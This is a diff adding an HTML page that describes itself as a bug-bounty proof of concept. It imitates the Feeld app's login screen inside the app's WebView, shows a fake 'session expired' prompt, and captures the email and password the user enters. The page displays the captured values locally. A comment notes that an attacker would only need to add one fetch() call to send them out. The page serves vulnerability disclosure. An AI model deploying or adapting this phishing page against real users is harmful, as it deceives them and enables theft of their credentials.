@@ -1,0 +1,42 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<!-- Security research proof-of-concept for the Feeld HackerOne bug bounty. Not affiliated with Feeld.
+     Demonstrates that the Feeld app's in-app WebView renders arbitrary external content.
+     This page does NOT transmit anything anywhere; submitted values are shown locally only. -->
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Feeld</title>
+<style>
+ :root{color-scheme:dark}
+ *{box-sizing:border-box;font-family:-apple-system,Roboto,Helvetica,Arial,sans-serif}
+ body{margin:0;background:#0f0f10;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:28px}
+ .logo{font-size:40px;font-weight:800;letter-spacing:-1px;margin-bottom:6px}
+ .sub{color:#b9b9bd;font-size:15px;margin-bottom:28px;text-align:center;max-width:320px;line-height:1.4}
+ form{width:100%;max-width:340px;display:flex;flex-direction:column;gap:14px}
+ label{font-size:13px;color:#cfcfd4;margin-bottom:-6px}
+ input{background:#1b1b1e;border:1px solid #333;border-radius:12px;padding:15px;color:#fff;font-size:16px}
+ input:focus{outline:none;border-color:#fff}
+ button{background:#fff;color:#0f0f10;border:0;border-radius:24px;padding:16px;font-size:16px;font-weight:700;margin-top:8px}
+ .note{margin-top:22px;color:#6f6f75;font-size:12px;text-align:center}
+ #done{display:none;max-width:340px;margin-top:20px;background:#13240f;border:1px solid #2e5a22;border-radius:12px;padding:16px;color:#8fe39a;font-size:13px;word-break:break-all}
+</style></head><body>
+ <div class="logo">Feeld</div>
+ <div class="sub">Your session has expired. Please sign in again to continue.</div>
+ <form id="f">
+   <label>Email</label>
+   <input id="email" type="email" placeholder="you@email.com" autocomplete="username" required>
+   <label>Password</label>
+   <input id="password" type="password" placeholder="Password" autocomplete="current-password" required>
+   <button type="submit">Log in</button>
+ </form>
+ <div id="done"></div>
+ <div class="note">Protected by Feeld</div>
+<script>
+ document.getElementById('f').addEventListener('submit', function(e){
+   e.preventDefault();
+   var email=document.getElementById('email').value, pw=document.getElementById('password').value;
+   // PoC: an attacker would send these to their server with one fetch(). This page keeps them local.
+   document.getElementById('f').style.display='none';
+   var d=document.getElementById('done');
+   d.style.display='block';
+   d.textContent='[PoC] Credentials captured by the attacker page:  email='+email+'  password='+pw;
+ });
+</script></body></html>
